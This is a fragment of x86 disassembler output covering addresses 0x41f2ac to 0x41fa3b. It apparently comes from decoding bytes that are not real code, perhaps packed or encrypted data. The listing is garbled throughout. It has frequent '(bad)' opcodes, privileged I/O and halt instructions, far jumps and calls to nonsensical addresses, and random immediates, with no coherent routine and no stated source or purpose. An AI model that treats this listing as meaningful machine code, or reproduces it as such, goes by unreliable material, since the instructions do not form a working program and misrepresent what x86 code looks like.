  41f2ac:	popf   
  41f2ad:	(bad)  
  41f2af:	mov    ebp,0xbb935ea7
  41f2b4:	imul   edx,DWORD PTR [ebx-0x163dfb4d],0x91ab04e6
  41f2be:	jo     0x41f274
  41f2c0:	sub    eax,0xd57599b8
  41f2c5:	dec    edx
  41f2c6:	dec    ebx
  41f2c7:	jg     0x41f31a
  41f2c9:	mov    dh,0xa4
  41f2cb:	faddp  st(6),st
  41f2cd:	jnp    0x41f28a
  41f2cf:	and    DWORD PTR [edx],edx
  41f2d1:	dec    ebp
  41f2d2:	pusha  
  41f2d3:	xor    ebp,ecx
  41f2d5:	ss in  al,dx
  41f2d7:	(bad)  
  41f2d8:	fs xchg ecx,eax
  41f2da:	mov    ch,0x62
  41f2dc:	(bad)  
  41f2dd:	sahf   
  41f2de:	dec    esp
  41f2df:	jno    0x41f2d3
  41f2e1:	jg     0x6bc90765
  41f2e7:	div    DWORD PTR ss:[ebx+esi*8-0x69]
  41f2ec:	sbb    edi,DWORD PTR [ebp-0x40d139de]
  41f2f2:	sbb    BYTE PTR [edx+0xb],0x50
  41f2f6:	xor    eax,0xdfc6161c
  41f2fb:	rcr    BYTE PTR [edx],0x8a
  41f2fe:	cmp    ebp,DWORD PTR [ebp-0x223f3abf]
  41f304:	jnp    0x41f312
  41f306:	mov    ah,0x3a
  41f308:	leave  
  41f309:	dec    esi
  41f30a:	xchg   edi,eax
  41f30b:	add    eax,0xb1f5abee
  41f310:	and    dx,WORD PTR [esi+0x57]
  41f314:	mov    dh,0xf4
  41f316:	call   0x300cf1c5
  41f31b:	mov    dh,0x9f
  41f31d:	cdq    
  41f31e:	xchg   ebp,eax
  41f31f:	push   cs
  41f320:	jns    0x41f366
  41f322:	stos   DWORD PTR es:[edi],eax
  41f323:	call   0xf3ec2d4b
  41f328:	ss jbe 0x41f2ef
  41f32b:	mov    al,ds:0xb47c1952
  41f330:	pop    ecx
  41f331:	cld    
  41f332:	test   DWORD PTR [ebp-0x698d494e],0xa6103685
  41f33c:	pop    ebp
  41f33d:	dec    edi
  41f33e:	test   DWORD PTR [ecx+0x2ed50bcd],ecx
  41f344:	inc    esp
  41f345:	clc    
  41f346:	jmp    0xc52f:0xed8239ad
  41f34d:	leave  
  41f34e:	xchg   BYTE PTR [esi+0x1e],al
  41f351:	xchg   DWORD PTR [ecx-0x3a],edx
  41f354:	pop    edx
  41f355:	mov    DWORD PTR [esi],eax
  41f357:	adc    eax,0xe4b66b63
  41f35c:	sub    esi,esi
  41f35e:	retf   0xa6d0
  41f361:	push   esi
  41f362:	inc    ecx
  41f363:	cmp    ebx,DWORD PTR [edx+0x44]
  41f366:	cs test eax,0xf2c7032b
  41f36c:	dec    esp
  41f36d:	jge    0x41f308
  41f36f:	test   BYTE PTR ds:0xb3260395,bh
  41f375:	push   esp
  41f376:	add    DWORD PTR [ebx],edx
  41f378:	add    dl,BYTE PTR [esi+ebp*8-0x6fe9fa4e]
  41f37f:	jmp    0x742b2d2d
  41f384:	xchg   esi,eax
  41f385:	aam    0x4b
  41f387:	aam    0x33
  41f389:	pop    ebp
  41f38a:	mov    eax,ds:0x9cfe89eb
  41f38f:	sbb    BYTE PTR [ebx],cl
  41f391:	dec    eax
  41f392:	cld    
  41f393:	mov    ch,0x29
  41f395:	mov    eax,0x74c08570
  41f39a:	mov    bl,0xa5
  41f39c:	ins    DWORD PTR es:[edi],dx
  41f39d:	add    edi,DWORD PTR [ebp+edi*2-0x1b]
  41f3a1:	xor    eax,esp
  41f3a3:	mov    ch,0x3c
  41f3a5:	lea    esp,[ebp-0x777c3bb5]
  41f3ab:	neg    BYTE PTR [esi]
  41f3ad:	inc    edx
  41f3ae:	ins    BYTE PTR es:[edi],dx
  41f3af:	add    dl,BYTE PTR [ecx]
  41f3b1:	scas   eax,DWORD PTR es:[edi]
  41f3b2:	xor    bh,dh
  41f3b4:	stos   BYTE PTR es:[edi],al
  41f3b5:	cld    
  41f3b6:	cmp    eax,0xc864d16e
  41f3bb:	mov    edi,DWORD PTR [edx]
  41f3bd:	xchg   ecx,eax
  41f3be:	shl    BYTE PTR [edi+0x73e15a57],cl
  41f3c4:	jg     0x41f3fb
  41f3c6:	mov    cl,0x65
  41f3c8:	test   esp,esp
  41f3ca:	test   al,0x5e
  41f3cc:	sub    eax,0x36cb5bfa
  41f3d1:	lock shl BYTE PTR [edi-0x143e0841],0x45
  41f3d9:	mov    eax,DWORD PTR [ecx+0x75275c2a]
  41f3df:	enter  0x77b5,0xd9
  41f3e3:	stc    
  41f3e4:	add    esp,ebx
  41f3e6:	mov    al,0xec
  41f3e8:	pop    edx
  41f3e9:	lds    ebp,FWORD PTR [ebx+0x5d19e803]
  41f3ef:	dec    edi
  41f3f0:	mov    ebp,0xde320ecc
  41f3f5:	stos   BYTE PTR es:[edi],al
  41f3f6:	mov    esi,0x19e4c02e
  41f3fb:	mov    ds:0x152ec6c9,eax
  41f400:	push   es
  41f401:	or     DWORD PTR [edx],0xb5c2cd52
  41f407:	(bad)  
  41f408:	aas    
  41f409:	xchg   ebx,eax
  41f40a:	push   DWORD PTR [esi+0x4]
  41f40d:	xchg   ebp,eax
  41f40e:	xchg   ebx,eax
  41f40f:	cdq    
  41f410:	es jmp 0x3731438e
  41f416:	or     dh,cl
  41f418:	sub    ecx,ebx
  41f41a:	jmp    0xbfee:0x8b412374
  41f421:	jb     0x41f417
  41f423:	retf   0x2246
  41f426:	jne    0x41f478
  41f428:	cld    
  41f429:	lea    ecx,[edi-0x63290556]
  41f42f:	int    0xb5
  41f431:	mov    eax,0xfc3eeccd
  41f436:	inc    esi
  41f437:	dec    esi
  41f438:	sub    ah,ch
  41f43a:	mov    bl,BYTE PTR [edi+0x34]
  41f43d:	(bad)  
  41f43e:	fwait
  41f43f:	imul   ecx,DWORD PTR [edx],0x4595155d
  41f445:	adc    al,0x2d
  41f447:	sahf   
  41f448:	popa   
  41f449:	dec    ebp
  41f44a:	jb     0x41f47b
  41f44c:	pop    ss
  41f44d:	out    dx,al
  41f44e:	push   cs
  41f44f:	mov    eax,0x47cf7124
  41f454:	(bad)  
  41f455:	sbb    eax,0x69fd409d
  41f45a:	sbb    dl,bh
  41f45c:	xchg   ecx,eax
  41f45d:	mov    cl,0x1f
  41f45f:	mov    ah,0x7b
  41f461:	inc    esp
  41f462:	xor    esi,edi
  41f464:	mov    BYTE PTR ds:0x5ca53cf7,dl
  41f46a:	jbe    0x41f474
  41f46c:	fisubr DWORD PTR [ebp+0x4c]
  41f46f:	adc    BYTE PTR [edi-0x7a99219b],ah
  41f475:	sahf   
  41f476:	shl    ah,1
  41f478:	xor    BYTE PTR [esi-0xf940e97],ch
  41f47e:	add    esi,esi
  41f480:	scas   eax,DWORD PTR es:[edi]
  41f481:	and    al,0xb7
  41f483:	add    BYTE PTR [ecx],0x12
  41f486:	stos   DWORD PTR es:[edi],eax
  41f487:	xchg   ecx,eax
  41f488:	sbb    DWORD PTR [ebx+0x9],ecx
  41f48b:	push   edi
  41f48c:	adc    ebx,DWORD PTR [edx-0x2e555726]
  41f492:	shl    BYTE PTR [eax+ebp*8],cl
  41f495:	dec    ebx
  41f496:	sbb    eax,0xe4ecd277
  41f49b:	jmp    0x9e173ba6
  41f4a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4a1:	pop    eax
  41f4a2:	mov    edx,0x259fb1b6
  41f4a7:	mov    dh,0xd
  41f4a9:	out    0x7c,al
  41f4ab:	mov    al,ds:0xdab837a6
  41f4b1:	sub    eax,0x6672c30e
  41f4b6:	and    eax,0xa66d123a
  41f4bb:	pop    ebp
  41f4bc:	sbb    al,0x85
  41f4be:	xchg   esp,eax
  41f4bf:	hlt    
  41f4c0:	dec    ebp
  41f4c1:	sbb    dh,BYTE PTR [esi-0x48b264ef]
  41f4c7:	xchg   ecx,eax
  41f4c8:	dec    esp
  41f4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ca:	fcom   QWORD PTR [ebx-0x7dcf7a6a]
  41f4d0:	outs   dx,DWORD PTR ds:[esi]
  41f4d1:	rcr    BYTE PTR [eax-0x39444594],1
  41f4d7:	mov    cl,0x1c
  41f4d9:	push   es
  41f4da:	cli    
  41f4db:	jae    0x41f543
  41f4dd:	pushf  
  41f4de:	jge    0x41f4d9
  41f4e0:	xchg   BYTE PTR [ebx+eiz*4-0x75],dh
  41f4e4:	leave  
  41f4e5:	or     eax,0x5cfb95fb
  41f4ea:	inc    esp
  41f4eb:	test   al,0x9b
  41f4ed:	lea    eax,[edx+eiz*2+0x5d]
  41f4f1:	adc    BYTE PTR [edi+edi*2+0x344ef7c5],ch
  41f4f8:	mov    ds:0xa81d05af,al
  41f4fd:	pushf  
  41f4fe:	mov    eax,0x4b536f3e
  41f503:	(bad)  
  41f504:	neg    al
  41f506:	dec    esp
  41f507:	ja     0x41f4a6
  41f509:	nop
  41f50a:	test   eax,0x319cfc57
  41f50f:	daa    
  41f510:	pop    ebx
  41f511:	mov    ecx,0xaebc5f84
  41f516:	out    0x13,eax
  41f518:	cdq    
  41f519:	aam    0x8
  41f51b:	dec    ecx
  41f51c:	cmp    edi,DWORD PTR [eax-0x71704ce2]
  41f522:	lahf   
  41f523:	and    eax,0x230f59b7
  41f528:	add    DWORD PTR [edi-0x67],eax
  41f52b:	fnstenv [edi-0x7af9d3e5]
  41f531:	mov    DWORD PTR [ebx+0x3a],eax
  41f534:	jecxz  0x41f523
  41f536:	pop    ds
  41f537:	mov    al,0x5e
  41f539:	push   ds
  41f53a:	jge    0x41f4fe
  41f53c:	sub    DWORD PTR [edx-0x24],esi
  41f53f:	cmp    al,BYTE PTR [esi]
  41f541:	cld    
  41f542:	pop    ebx
  41f543:	or     al,0x39
  41f545:	(bad)  
  41f546:	cmc    
  41f547:	out    0xa9,eax
  41f549:	(bad)  
  41f54a:	jb     0x41f4f4
  41f54c:	cmc    
  41f54d:	jp     0x41f509
  41f54f:	cwde   
  41f550:	push   esp
  41f551:	test   eax,0x998f0044
  41f556:	dec    edx
  41f557:	jle    0x41f50c
  41f559:	neg    dh
  41f55b:	stc    
  41f55c:	stos   DWORD PTR es:[edi],eax
  41f55d:	jl     0x41f547
  41f55f:	dec    ecx
  41f560:	cld    
  41f561:	cmp    eax,0x107aa183
  41f566:	dec    eax
  41f567:	es clc 
  41f569:	sub    DWORD PTR [esi-0x48],0xed301015
  41f570:	(bad)  
  41f572:	scas   al,BYTE PTR es:[edi]
  41f573:	mul    BYTE PTR [edi+0x302d61ef]
  41f579:	and    ebx,DWORD PTR [esi-0x72]
  41f57c:	cmp    al,0x10
  41f57e:	lods   eax,DWORD PTR ds:[esi]
  41f57f:	jbe    0x41f5dc
  41f581:	jbe    0x41f560
  41f583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f584:	add    edi,0xffffffb5
  41f587:	push   ecx
  41f588:	fst    st(2)
  41f58a:	cmp    BYTE PTR [ebx-0x79],dl
  41f58d:	aam    0x42
  41f58f:	adc    BYTE PTR [esi-0x41],al
  41f592:	mov    ebx,0xce37771
  41f597:	xor    eax,0xba24d609
  41f59c:	mov    eax,ds:0xe8475f1c
  41f5a1:	xchg   ebx,eax
  41f5a2:	xor    al,ah
  41f5a4:	push   edi
  41f5a5:	ins    BYTE PTR es:[edi],dx
  41f5a6:	pop    ebp
  41f5a7:	ret    0xf017
  41f5aa:	mul    BYTE PTR ds:0x836c5a66
  41f5b0:	fdivr  DWORD PTR [ecx*4+0x13d6ddbe]
  41f5b7:	hlt    
  41f5b8:	jg     0x41f634
  41f5ba:	mov    esp,0x41b81fe6
  41f5bf:	inc    ecx
  41f5c0:	addr16 sbb eax,0xd9eeca4a
  41f5c6:	jne    0x41f550
  41f5c8:	jne    0x41f618
  41f5ca:	jmp    0xc72c:0x212e40f4
  41f5d1:	(bad)  
  41f5d2:	mov    al,0xc9
  41f5d4:	mov    ebp,0xe65094af
  41f5d9:	dec    ecx
  41f5da:	stos   BYTE PTR es:[edi],al
  41f5db:	loop   0x41f58d
  41f5dd:	push   ss
  41f5de:	sub    DWORD PTR [ebx],eax
  41f5e0:	xchg   DWORD PTR [ebp+0x4f4e8cc4],esp
  41f5e6:	jg     0x41f581
  41f5e8:	jne    0x41f63f
  41f5ea:	cmp    al,BYTE PTR [edx]
  41f5ec:	inc    edi
  41f5ed:	jp     0x41f581
  41f5ef:	mov    cl,bl
  41f5f1:	xchg   esi,eax
  41f5f2:	jno    0x41f62a
  41f5f4:	adc    al,0x81
  41f5f6:	jl     0x41f674
  41f5f8:	push   0xffffff8c
  41f5fa:	or     bh,BYTE PTR [eax+0x6327e880]
  41f600:	xchg   ebx,eax
  41f601:	mov    dl,BYTE PTR [esi-0x6d]
  41f604:	outs   dx,DWORD PTR ds:[esi]
  41f605:	scas   al,BYTE PTR es:[edi]
  41f606:	mov    bh,0xb3
  41f608:	jns    0x41f67d
  41f60a:	inc    eax
  41f60b:	mov    ah,0xa6
  41f60d:	adc    DWORD PTR [ebp+0xa],eax
  41f610:	les    esp,FWORD PTR [ebx+0x7e]
  41f613:	scas   eax,DWORD PTR es:[edi]
  41f614:	ret    0x675a
  41f617:	inc    esp
  41f618:	mov    ebp,0x2133743a
  41f61d:	(bad)  
  41f61f:	call   0x4bc94b47
  41f624:	call   0x5131b950
  41f629:	or     dh,BYTE PTR [ebp-0x66]
  41f62c:	arpl   WORD PTR [ecx+0x16],ax
  41f62f:	push   ebp
  41f630:	bound  edi,QWORD PTR [esi*8-0xf37f0c0]
  41f637:	xor    eax,0x46cb889f
  41f63c:	arpl   bp,bx
  41f63e:	sbb    bh,BYTE PTR [esi]
  41f640:	push   0x3bef41b2
  41f645:	out    dx,eax
  41f646:	xchg   esi,eax
  41f647:	(bad)  
  41f648:	ja     0x41f62d
  41f64a:	push   ebp
  41f64b:	push   edx
  41f64c:	xchg   edx,eax
  41f64d:	cmp    bh,BYTE PTR [edx-0x5b15d4ac]
  41f653:	call   0x16d0:0x9183ef40
  41f65a:	jb     0x41f5e6
  41f65c:	cwde   
  41f65d:	push   es
  41f65e:	sbb    dl,BYTE PTR [ecx+0x58]
  41f661:	es out dx,eax
  41f663:	leave  
  41f664:	and    al,0x1e
  41f666:	loope  0x41f5fa
  41f668:	and    ah,BYTE PTR [edx+eiz*2+0x146a5842]
  41f66f:	sbb    al,0x4c
  41f671:	xchg   ecx,eax
  41f672:	aas    
  41f673:	pop    ds
  41f674:	add    ebx,DWORD PTR [ebx-0x2f]
  41f677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f679:	outs   dx,BYTE PTR ds:[esi]
  41f67a:	cmp    BYTE PTR [edx],0x3e
  41f67d:	push   esp
  41f67e:	pushf  
  41f67f:	aaa    
  41f680:	sub    al,0xa4
  41f682:	and    eax,DWORD PTR [edi+esi*1+0x1981799]
  41f689:	mov    eax,0xe8e6d952
  41f68e:	pop    edi
  41f68f:	cwde   
  41f690:	jo     0x41f6c5
  41f692:	adc    eax,0x20b6e581
  41f697:	sub    al,0xa7
  41f699:	sti    
  41f69a:	jle    0x41f64c
  41f69c:	mov    al,cs:0xeff578b
  41f6a2:	inc    eax
  41f6a3:	lock imul edi,DWORD PTR [ebp+eiz*4-0x37b64215],0xffffff89
  41f6ac:	int3   
  41f6ad:	xor    DWORD PTR cs:[ecx-0x80],0xffffffb1
  41f6b2:	mov    bl,0x35
  41f6b4:	rol    BYTE PTR [edx+ebx*8+0x1211ec67],cl
  41f6bb:	cwde   
  41f6bc:	js     0x41f703
  41f6be:	(bad)  
  41f6bf:	xchg   ebx,eax
  41f6c0:	aam    0x3f
  41f6c2:	(bad)  [edx-0x7ac2ec96]
  41f6c8:	gs ja  0x41f737
  41f6cb:	push   eax
  41f6cc:	stos   DWORD PTR es:[edi],eax
  41f6cd:	cld    
  41f6ce:	push   0xfffffffb
  41f6d0:	cmovb  ebx,ecx
  41f6d3:	repz aaa 
  41f6d5:	jmp    0x41f6c9
  41f6d7:	outs   dx,DWORD PTR ds:[esi]
  41f6d8:	inc    esp
  41f6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6da:	mov    al,0x9b
  41f6dc:	mov    eax,0x449827a2
  41f6e1:	pop    es
  41f6e2:	cmp    bh,BYTE PTR [ecx]
  41f6e4:	jnp    0x41f6af
  41f6e6:	(bad)
  41f6ea:	jo     0x41f6ea
  41f6ec:	ror    DWORD PTR [esi],0xfa
  41f6ef:	aaa    
  41f6f0:	inc    ecx
  41f6f1:	retf   0xcb98
  41f6f4:	jmp    0x3fb27f6b
  41f6f9:	cmp    ecx,edi
  41f6fb:	push   eax
  41f6fc:	add    BYTE PTR [edx],al
  41f6fe:	in     eax,0x69
  41f700:	push   ss
  41f701:	pop    ebp
  41f702:	popa   
  41f703:	push   ebp
  41f704:	push   ds
  41f705:	dec    esp
  41f706:	mul    BYTE PTR [eax]
  41f708:	and    ecx,DWORD PTR [edi-0x27]
  41f70b:	or     eax,0x8a4b0ee5
  41f710:	xor    BYTE PTR [ecx],al
  41f712:	sub    al,0xd2
  41f714:	push   cs
  41f715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f716:	adc    DWORD PTR ds:[eax],0xffffffbd
  41f71a:	sub    al,0x24
  41f71c:	push   0x64
  41f71e:	(bad)  
  41f71f:	bound  edx,QWORD PTR [edx]
  41f721:	mov    ds:0xe6ca2dc8,eax
  41f726:	mov    cl,0xcd
  41f728:	es adc eax,0x85bc07eb
  41f72e:	and    eax,0xf8e99d31
  41f733:	nop
  41f734:	and    eax,0x6af8b824
  41f739:	mov    ah,BYTE PTR [esi+ebp*2]
  41f73c:	clc    
  41f73d:	bound  ebx,QWORD PTR [ebp-0x45]
  41f740:	jg     0x41f6ec
  41f742:	cdq    
  41f743:	push   esi
  41f744:	jb     0x41f75a
  41f746:	pop    ss
  41f747:	jo     0x41f752
  41f749:	push   eax
  41f74a:	jmp    0x63b2:0x87d2ac4e
  41f751:	mov    ecx,0x53b4fedb
  41f756:	mov    ecx,0x1dacb5a4
  41f75b:	loope  0x41f781
  41f75d:	neg    DWORD PTR [edi-0x3c2be809]
  41f763:	cdq    
  41f764:	jge    0x41f6ec
  41f766:	and    al,0xf3
  41f768:	fwait
  41f769:	mov    edi,0xaac65833
  41f76e:	cmp    al,0x81
  41f770:	frstor [esi-0x32150ac0]
  41f776:	pusha  
  41f777:	mov    ?,WORD PTR ds:0x41865b9c
  41f77d:	(bad)  
  41f77e:	push   edx
  41f77f:	leave  
  41f780:	cli    
  41f781:	shl    BYTE PTR [eax],0xca
  41f784:	shl    DWORD PTR [ebp-0x244e6291],cl
  41f78a:	inc    ebp
  41f78b:	cmp    dh,BYTE PTR [edx+0x70500315]
  41f791:	iret   
  41f792:	addr16 mov ebx,0xe1b13349
  41f798:	dec    ebx
  41f799:	pop    ecx
  41f79a:	sar    BYTE PTR [esi+ebp*1-0x2c],cl
  41f79e:	sub    edi,ebx
  41f7a0:	outs   dx,DWORD PTR ds:[esi]
  41f7a1:	js     0x41f807
  41f7a3:	ss pusha 
  41f7a5:	pop    ebp
  41f7a6:	cs retf 0x294e
  41f7aa:	sub    ch,BYTE PTR [ebx+0x23f0e7c1]
  41f7b0:	push   0x9f16cacd
  41f7b5:	inc    ecx
  41f7b6:	mov    ebx,0x35356114
  41f7bb:	les    ebp,FWORD PTR [edx-0x6507181a]
  41f7c1:	push   esi
  41f7c2:	in     eax,0x94
  41f7c4:	cld    
  41f7c5:	fsubr  st,st(0)
  41f7c7:	sub    al,0xe9
  41f7ca:	adc    eax,0x3f970729
  41f7cf:	jp     0x41f75d
  41f7d1:	loope  0x41f82b
  41f7d3:	cdq    
  41f7d4:	mov    dl,0xa1
  41f7d6:	rol    bl,0x6b
  41f7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7da:	adc    ah,dl
  41f7dc:	inc    ecx
  41f7dd:	xor    edi,DWORD PTR [edx+0x3b]
  41f7e0:	(bad)  
  41f7e1:	sbb    BYTE PTR [edx],0xa2
  41f7e4:	push   ss
  41f7e5:	aam    0xab
  41f7e7:	shr    bl,cl
  41f7e9:	ins    BYTE PTR es:[edi],dx
  41f7ea:	sub    cl,BYTE PTR [eax-0x34]
  41f7ed:	pop    edx
  41f7ee:	aaa    
  41f7ef:	xchg   dl,al
  41f7f1:	mul    BYTE PTR [esi-0x13]
  41f7f4:	lods   eax,DWORD PTR ds:[esi]
  41f7f5:	push   edx
  41f7f6:	add    ebp,DWORD PTR [eax-0x4d]
  41f7f9:	sbb    bl,BYTE PTR [ecx-0x44]
  41f7fc:	test   DWORD PTR [ebp-0x2d60bcc0],ecx
  41f802:	rol    DWORD PTR es:[ebp-0x35e65e0e],cl
  41f809:	fidivr WORD PTR [ebp+0x32]
  41f80c:	arpl   WORD PTR [esi],dx
  41f80e:	xchg   ebx,eax
  41f80f:	inc    eax
  41f810:	test   eax,0xb31f18dc
  41f815:	test   BYTE PTR [edx+0x42],ch
  41f818:	test   BYTE PTR [ebp+0x1f],0xa6
  41f81c:	xor    bh,BYTE PTR [eax]
  41f81e:	jle    0x41f803
  41f820:	sub    BYTE PTR [edx-0xb],dl
  41f823:	adc    eax,0x56f4c39e
  41f828:	cmp    dl,bh
  41f82a:	jno    0x41f826
  41f82c:	sub    ebx,ebx
  41f82e:	dec    BYTE PTR [ebx+ebx*8+0x278e935f]
  41f835:	in     al,dx
  41f836:	jbe    0x41f7dc
  41f838:	inc    ebp
  41f839:	mov    al,ds:0xd4bea135
  41f83e:	fstp   QWORD PTR [esi+0x64532e00]
  41f844:	outs   dx,DWORD PTR ds:[esi]
  41f845:	pop    es
  41f846:	popa   
  41f847:	jnp    0x41f884
  41f849:	mov    esi,0x603dc988
  41f84e:	test   eax,0x49dd57e0
  41f853:	xchg   ebx,eax
  41f854:	(bad)  
  41f855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f856:	sbb    al,0xf9
  41f858:	in     eax,0x2e
  41f85a:	mov    ecx,0xcd41244d
  41f85f:	test   DWORD PTR [ecx+0x2a],eax
  41f862:	mov    ebp,0xecc1c544
  41f867:	add    BYTE PTR [eax],ah
  41f869:	(bad)  
  41f86a:	and    al,BYTE PTR [edi]
  41f86c:	mov    BYTE PTR [eax+0x30],dh
  41f86f:	jae    0x41f816
  41f871:	pop    ds
  41f872:	jmp    0xbb490737
  41f877:	cmp    cl,BYTE PTR [ebp+ebp*2-0x42]
  41f87b:	push   0x613d3a65
  41f880:	lds    ecx,FWORD PTR [eax+esi*4-0x1f7339c8]
  41f887:	add    edx,DWORD PTR [edx]
  41f889:	into   
  41f88a:	ds loop 0x41f8b4
  41f88d:	addr16 pop ss
  41f88f:	cli    
  41f890:	mov    bl,0xfe
  41f892:	shl    DWORD PTR [edi+0x3b],1
  41f895:	cmp    al,0x99
  41f897:	pop    edi
  41f898:	xor    dl,ch
  41f89a:	cmp    DWORD PTR [ebx+0x35],0x7aba69b
  41f8a1:	cs cli 
  41f8a3:	or     BYTE PTR [eax+edx*2-0x2f20ec6c],dl
  41f8aa:	aad    0x11
  41f8ac:	(bad)  
  41f8ad:	dec    esp
  41f8ae:	adc    BYTE PTR [eax+0x4d],bh
  41f8b1:	std    
  41f8b2:	popa   
  41f8b3:	mov    edi,DWORD PTR [esi-0x50]
  41f8b6:	mov    esi,0xebef7da7
  41f8bb:	outs   dx,BYTE PTR ds:[esi]
  41f8bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8bd:	les    esi,FWORD PTR [eax]
  41f8bf:	(bad)  
  41f8c0:	ret    0xee0c
  41f8c3:	and    DWORD PTR [edi],0xe9c109ee
  41f8c9:	in     al,dx
  41f8ca:	retf   
  41f8cb:	dec    esi
  41f8cc:	dec    ebp
  41f8cd:	xor    eax,0xde38dffe
  41f8d2:	mov    WORD PTR [ecx-0x61d41ef4],?
  41f8d8:	in     eax,0x3c
  41f8da:	and    al,BYTE PTR [ecx]
  41f8dc:	(bad)  
  41f8dd:	hlt    
  41f8de:	mov    cl,0x69
  41f8e0:	inc    ebp
  41f8e1:	jns    0x41f8ca
  41f8e3:	and    ecx,DWORD PTR [edi-0x42a565e8]
  41f8e9:	sub    al,0xc0
  41f8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8ec:	lods   eax,DWORD PTR ds:[esi]
  41f8ed:	xor    al,ch
  41f8ef:	(bad)  
  41f8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8f1:	dec    ecx
  41f8f2:	sbb    ecx,ecx
  41f8f4:	mul    BYTE PTR ds:0x24d9cff4
  41f8fb:	jge    0x41f933
  41f8fd:	xchg   esi,eax
  41f8fe:	or     eax,0x2af0df23
  41f903:	out    0x57,eax
  41f905:	out    dx,eax
  41f906:	xchg   edx,eax
  41f907:	fwait
  41f908:	loop   0x41f901
  41f90a:	jns    0x41f8ce
  41f90c:	pop    esi
  41f90d:	inc    edi
  41f90e:	pop    ebx
  41f90f:	lods   al,BYTE PTR ds:[esi]
  41f910:	sbb    DWORD PTR [ecx-0x31],0x93034d6e
  41f917:	imul   BYTE PTR [ecx+0x30]
  41f91a:	fnstcw WORD PTR [esi-0x1f]
  41f91d:	mov    ebp,0x3030fc3
  41f922:	or     al,0xc9
  41f924:	mov    esp,0x8073c1c5
  41f929:	mov    edi,0xfb4dbb7c
  41f92e:	js     0x41f9a2
  41f930:	jmp    edx
  41f932:	sub    bl,BYTE PTR [edx-0x5436079c]
  41f938:	aaa    
  41f939:	cmp    esi,DWORD PTR [edx+0x33]
  41f93c:	ins    DWORD PTR es:[edi],dx
  41f93d:	xchg   ebp,eax
  41f93e:	clc    
  41f93f:	or     al,0xf4
  41f941:	sbb    esi,DWORD PTR [ebx]
  41f943:	mov    esi,0x5659324b
  41f948:	xor    esp,DWORD PTR [ebx+0x5c85e975]
  41f94e:	add    eax,0xf90c9393
  41f953:	scas   eax,DWORD PTR es:[edi]
  41f954:	inc    ebp
  41f955:	jge    0x41f9a8
  41f957:	xor    cl,BYTE PTR [esi]
  41f959:	jecxz  0x41f932
  41f95b:	inc    edx
  41f95c:	xor    al,0x12
  41f95e:	adc    bl,al
  41f960:	inc    ecx
  41f961:	mov    dl,0xe6
  41f963:	push   ecx
  41f964:	mov    ebx,0x78d88408
  41f969:	in     eax,dx
  41f96a:	enter  0x7bf9,0x30
  41f96e:	ret    
  41f96f:	les    eax,FWORD PTR [esi]
  41f971:	jnp    0x41f9e0
  41f973:	jno    0x41f938
  41f975:	stos   DWORD PTR es:[edi],eax
  41f976:	int    0xe3
  41f978:	iret   
  41f979:	and    DWORD PTR [esi+0x5c04418a],0xb343e802
  41f983:	cdq    
  41f984:	fbstp  TBYTE PTR [ecx]
  41f986:	fs dec esi
  41f988:	mov    eax,ds:0x63ef5d00
  41f98d:	cmp    al,0x2d
  41f98f:	and    DWORD PTR [esi-0x4eddde1a],esi
  41f995:	loopne 0x41f94f
  41f997:	inc    edx
  41f998:	mov    esp,0x3474c605
  41f99d:	xchg   esi,eax
  41f99e:	mov    ebp,0xa390ee5f
  41f9a3:	mov    DWORD PTR [esi+0x58],ebp
  41f9a6:	jbe    0x41f9f4
  41f9a8:	hlt    
  41f9a9:	or     al,0xe9
  41f9ab:	xchg   ebp,eax
  41f9ac:	bound  ecx,QWORD PTR [eax-0x7e731257]
  41f9b2:	lds    esi,FWORD PTR [eax]
  41f9b4:	and    al,0xbc
  41f9b6:	sub    al,0xe6
  41f9b8:	outs   dx,BYTE PTR ds:[esi]
  41f9b9:	xchg   edi,eax
  41f9ba:	adc    edx,DWORD PTR [edi-0x54]
  41f9bd:	(bad)  
  41f9be:	std    
  41f9bf:	pusha  
  41f9c0:	popa   
  41f9c1:	leave  
  41f9c2:	dec    edi
  41f9c3:	lods   eax,DWORD PTR ds:[esi]
  41f9c4:	lods   al,BYTE PTR ds:[esi]
  41f9c5:	and    DWORD PTR [ecx-0x43],edi
  41f9c8:	pop    ss
  41f9c9:	imul   ebx,DWORD PTR [ebp+0x45f3c43],0xd16d24e2
  41f9d3:	add    al,0x9e
  41f9d5:	data16 fistp DWORD PTR [edi+eax*1-0x45]
  41f9da:	and    esi,edx
  41f9dc:	mov    ds,WORD PTR [esi+0xe]
  41f9df:	mov    ch,0x6d
  41f9e1:	test   al,0x20
  41f9e3:	aaa    
  41f9e4:	mov    DWORD PTR [edi+0x1791a5f4],ebx
  41f9ea:	xchg   BYTE PTR ds:0xa976afc0,dl
  41f9f0:	out    dx,al
  41f9f1:	push   ecx
  41f9f2:	jnp    0x41f9f8
  41f9f4:	xchg   edi,eax
  41f9f5:	mov    cl,0xcd
  41f9f7:	nop
  41f9f8:	and    al,0xd9
  41f9fa:	daa    
  41f9fb:	cmp    al,0x76
  41f9fd:	cld    
  41f9fe:	mov    al,0xcd
  41fa00:	aas    
  41fa01:	les    eax,FWORD PTR ds:0xef3edb3d
  41fa07:	loopne 0x41fa11
  41fa09:	repnz pop ss
  41fa0b:	mov    bl,0xef
  41fa0d:	or     DWORD PTR [esp+eax*4-0x6e96696b],esi
  41fa14:	call   0xebfb:0x853edfeb
  41fa1b:	and    DWORD PTR [ebp+ebp*1-0x3d],ebp
  41fa1f:	mov    cl,0x52
  41fa21:	call   0x4186:0xab8bda5e
  41fa28:	shl    DWORD PTR [eax],cl
  41fa2a:	retf   
  41fa2b:	das    
  41fa2c:	pop    esi
  41fa2d:	sbb    dl,BYTE PTR [edi+0xe895d5e]
  41fa33:	cmp    BYTE PTR [edi+0x3d],0xf
  41fa37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa38:	pop    es
  41fa39:	add    esi,esp
  41fa3b:	dec    edi
